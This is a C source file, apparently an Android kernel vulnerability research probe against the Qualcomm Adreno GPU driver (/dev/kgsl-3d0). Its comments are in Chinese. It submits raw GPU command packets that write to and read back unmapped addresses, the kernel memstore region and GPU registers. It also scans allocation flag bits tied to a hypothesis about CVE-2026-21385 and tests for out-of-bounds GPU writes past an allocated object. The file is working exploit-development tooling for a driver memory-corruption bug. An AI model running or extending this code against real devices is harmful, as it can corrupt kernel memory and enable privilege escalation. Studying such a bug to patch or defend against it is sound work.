/* kgsl_tricheck2.c — 三项收尾判别
 * wrva     : 未映射 VA 写后读回(真零页 vs 静默丢弃)
 * memstore : GPU 侧读 0xfff00000+ctx*40 (sopt/eopt) — memstore 是否 GPU 可见
 * regs     : CP_REG_TO_MEM 寄存器读表
 * alignhi  : 高位 flags(bit29-31) 扫描 — CVE-2026-21385 负 align 假说
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include "adrenaline.h"

typedef struct { uint64_t size, flags, va_len, mmapsize; uint32_t id, metadata_len; uint64_t metadata; } gpuobj_alloc_t;
typedef struct { uint64_t gpuaddr, flags, size, va_len, va_addr; uint32_t id; } gpuobj_info_t;
typedef struct { uint64_t flags, priv; uint32_t id, type, len; } gpuobj_free_t;

#define IOCTL_OBJALLOC _IOWR(0x09, 0x45, gpuobj_alloc_t)
#define IOCTL_OBJINFO  _IOWR(0x09, 0x47, gpuobj_info_t)
#define IOCTL_DCC      _IOWR(0x09, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_DCD      _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_GC       _IOWR(0x09, 0x4A, struct kgsl_gpu_command)

static int fd;
static uint64_t g_clsz;
static uint32_t *ib, *out;
static uint64_t ib_ga, out_ga;

static void ctx_destroy(uint32_t ctx) {
    struct kgsl_drawctxt_destroy req = { .drawctxt_id = ctx };
    ioctl(fd, IOCTL_DCD, &req);
}


static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}

static int ctx_create(uint32_t *ctx) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, IOCTL_DCC, &req);
    if (r) return r;
    *ctx = req.drawctxt_id;
    return 0;
}

static int gpu_command(uint32_t ctx, uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, IOCTL_GC, &req);
}

/* canary: out+0x700 <- 0xA5A5A5A5, 返回 1=ctx 健康 */
static int canary(uint32_t ctx) {
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(out_ga + 0x700);
    *c++ = upper_32_bits(out_ga + 0x700);
    *c++ = 0xA5A5A5A5;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    int r = gpu_command(ctx, ib_ga, 16);
    if (r) return -1;
    sleep(1);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    return out[0x1C0] == 0xA5A5A5A5;
}

static void setup(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); exit(1); }
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    out = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000); memset(out, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map ib fail\n"); exit(1); }
    ib_ga = m.gpuaddr;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)out; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map out fail\n"); exit(1); }
    out_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx out_ga=0x%llx\n", (unsigned long long)ib_ga, (unsigned long long)out_ga);
}

/* 未映射 VA: 写 0xB00B0000+idx 再读回 */
static void do_wrva(void) {
    const uint64_t vas[] = { 0x1000, 0xfc000000, 0xfff00000, 0x4000000000ull - 0x1000, 0x8000000000ull };
    for (unsigned i = 0; i < sizeof(vas)/sizeof(vas[0]); i++) {
        uint64_t va = vas[i];
        uint32_t ctx;
        ctx_create(&ctx);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = lower_32_bits(va); *c++ = upper_32_bits(va);
        *c++ = 0xB00B0000 | i;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        int r1 = gpu_command(ctx, ib_ga, 16);
        sleep(1);
        /* 读回 */
        c = ib;
        *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
        *c++ = 0;
        *c++ = lower_32_bits(out_ga + 0x800); *c++ = upper_32_bits(out_ga + 0x800);
        *c++ = lower_32_bits(va);             *c++ = upper_32_bits(va);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        int r2 = gpu_command(ctx, ib_ga, 24);
        sleep(1);
        int cv = canary(ctx);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("VA 0x%012llx: w=%d r=%d canary=%d readback=0x%08x %s\n",
               (unsigned long long)va, r1, r2, cv, out[0x200],
               out[0x200] == (0xB00B0000u | i) ? "<<< 写读一致(真映射!)" : "(丢弃/零)");
        ctx_destroy(ctx);
    }
}

/* memstore: canary 退役后读 GPU 0xfff00000+ctx*40 (+8) */
static void do_memstore(void) {
    uint32_t ctx;
    ctx_create(&ctx);
    int cv = canary(ctx);   /* 产生一次退役 → 时间戳应写入 memstore[ctx*40] */
    printf("ctx=%u canary=%d\n", ctx, cv);
    for (int off = 0; off <= 8; off += 8) {
        uint64_t va = 0xfff00000ull + (uint64_t)ctx * 40 + off;
        uint32_t *c = ib;
        *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
        *c++ = 0;
        *c++ = lower_32_bits(out_ga + 0x800); *c++ = upper_32_bits(out_ga + 0x800);
        *c++ = lower_32_bits(va);             *c++ = upper_32_bits(va);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        gpu_command(ctx, ib_ga, 24);
        sleep(1);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("  GPU read memstore[ctx*40+%d] (VA 0x%llx) = 0x%08x\n", off,
               (unsigned long long)va, out[0x200]);
    }
    /* 对照: 同页低地址(全局区) */
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
    *c++ = 0;
    *c++ = lower_32_bits(out_ga + 0x800); *c++ = upper_32_bits(out_ga + 0x800);
    *c++ = lower_32_bits(0xfff00000ull + 0x20); *c++ = upper_32_bits(0xfff00000ull + 0x20);
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    gpu_command(ctx, ib_ga, 24);
    sleep(1);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    printf("  GPU read memstore+0x20 (ctx 槽对照) = 0x%08x\n", out[0x200]);
    ctx_destroy(ctx);
}

/* 寄存器读表 */
static void do_regs(void) {
    const uint32_t regs[] = { 0x000, 0x200, 0x201, 0x203, 0x205, 0x206, 0x210,
                              0x600, 0x611, 0x612, 0x613, 0x614, 0x615, 0x616, 0x617,
                              0x618, 0x619, 0x61a, 0x61b, 0x61c, 0x61d, 0x61e, 0x61f };
    for (unsigned i = 0; i < sizeof(regs)/sizeof(regs[0]); i++) {
        uint32_t ctx;
        ctx_create(&ctx);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0x3e, 3);   /* CP_REG_TO_MEM */
        *c++ = regs[i];
        *c++ = lower_32_bits(out_ga + 0x600);
        *c++ = upper_32_bits(out_ga + 0x600);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        int r = gpu_command(ctx, ib_ga, 16);
        sleep(1);
        int cv = canary(ctx);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
        printf("REG 0x%03x -> 0x%08x (submit=%d canary=%d)\n", regs[i], out[0x180], r, cv);
        ctx_destroy(ctx);
    }
}

/* 高位 flags 扫描 */
static void do_alignhi(void) {
    const uint64_t flags_list[] = {
        0x20000000ull, 0x40000000ull, 0x60000000ull,
        0x80000000ull, 0xA0000000ull, 0xC0000000ull, 0xE0000000ull,
        0xFF000000ull, 0xFF800000ull, 0xFFFF0000ull, 0xFFFFFFFFull,
        0x80000001ull, 0x01000000ull, 0x81000000ull,
    };
    for (unsigned i = 0; i < sizeof(flags_list)/sizeof(flags_list[0]); i++) {
        gpuobj_alloc_t a; memset(&a, 0, sizeof(a));
        a.size = 0x1000; a.flags = flags_list[i];
        int r = ioctl(fd, IOCTL_OBJALLOC, &a);
        if (r) { printf("flags %016llx -> EINVAL(%d)\n", (unsigned long long)flags_list[i], errno); continue; }
        gpuobj_info_t gi; memset(&gi, 0, sizeof(gi)); gi.id = a.id;
        uint64_t ga = ~0ull;
        if (!ioctl(fd, IOCTL_OBJINFO, &gi)) ga = gi.gpuaddr;
        printf("flags %016llx -> id=%u gpuaddr=0x%llx mmapsize=%llu\n",
               (unsigned long long)flags_list[i], a.id, (unsigned long long)ga,
               (unsigned long long)a.mmapsize);
        gpuobj_free_t f; memset(&f, 0, sizeof(f)); f.id = a.id;
        ioctl(fd, _IOW(0x09, 0x46, gpuobj_free_t), &f);
    }
}

/* 0xFFFFFFFF 异常 gpuaddr=0xee000000 的后备检查 */
static void do_ee(void) {
    gpuobj_alloc_t a; memset(&a, 0, sizeof(a));
    a.size = 0x1000; a.flags = 0xFFFFFFFFull;
    int r = ioctl(fd, IOCTL_OBJALLOC, &a);
    if (r) { printf("alloc fail %s\n", strerror(errno)); return; }
    gpuobj_info_t gi; memset(&gi, 0, sizeof(gi)); gi.id = a.id;
    uint64_t ga = ~0ull;
    if (!ioctl(fd, IOCTL_OBJINFO, &gi)) ga = gi.gpuaddr;
    printf("alloc id=%u gpuaddr=0x%llx\n", a.id, (unsigned long long)ga);
    if (ga == ~0ull) return;
    uint32_t ctx;
    ctx_create(&ctx);
    /* 写 ga+0x100 = 0x5EE00001 */
    uint32_t *c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(ga + 0x100); *c++ = upper_32_bits(ga + 0x100);
    *c++ = 0x5EE00001;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    printf("GPU write 0x%llx <- 0x5EE00001: submit=%d\n", (unsigned long long)(ga+0x100), gpu_command(ctx, ib_ga, 16));
    sleep(1);
    /* 读回 */
    c = ib;
    *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
    *c++ = 0;
    *c++ = lower_32_bits(out_ga + 0x800); *c++ = upper_32_bits(out_ga + 0x800);
    *c++ = lower_32_bits(ga + 0x100);     *c++ = upper_32_bits(ga + 0x100);
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    gpu_command(ctx, ib_ga, 24);
    sleep(1);
    int cv = canary(ctx);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    printf("readback=0x%08x canary=%d %s\n", out[0x200], cv,
           out[0x200] == 0x5EE00001 ? "<<< 0xee000000 有真实后备(异常 VA 分配坐实!)" : "(无后备/丢弃)");
    /* 再测越界: ga+0x4000(对象 0x1000 之外) */
    c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = lower_32_bits(ga + 0x4000); *c++ = upper_32_bits(ga + 0x4000);
    *c++ = 0x5EE00002;
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    printf("GPU write ga+0x4000(越界) <- 0x5EE00002: submit=%d\n", gpu_command(ctx, ib_ga, 16));
    sleep(1);
    c = ib;
    *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
    *c++ = 0;
    *c++ = lower_32_bits(out_ga + 0x800); *c++ = upper_32_bits(out_ga + 0x800);
    *c++ = lower_32_bits(ga + 0x4000);    *c++ = upper_32_bits(ga + 0x4000);
    cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
    gpu_command(ctx, ib_ga, 24);
    sleep(1);
    cv = canary(ctx);
    cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
    printf("readback=0x%08x canary=%d %s\n", out[0x200], cv,
           out[0x200] == 0x5EE00002 ? "<<< 越界写可读回!!!" : "(范围外无后备)");
    ctx_destroy(ctx);
    gpuobj_free_t f; memset(&f, 0, sizeof(f)); f.id = a.id;
    ioctl(fd, _IOW(0x09, 0x46, gpuobj_free_t), &f);
}

int main(int argc, char **argv) {
    if (argc < 2) { printf("usage: tricheck2 wrva|memstore|regs|alignhi|ee\n"); return 1; }
    setup();
    if (!strcmp(argv[1], "wrva")) do_wrva();
    else if (!strcmp(argv[1], "memstore")) do_memstore();
    else if (!strcmp(argv[1], "regs")) do_regs();
    else if (!strcmp(argv[1], "alignhi")) do_alignhi();
    else if (!strcmp(argv[1], "ee")) do_ee();
    printf("done alive\n");
    return 0;
}
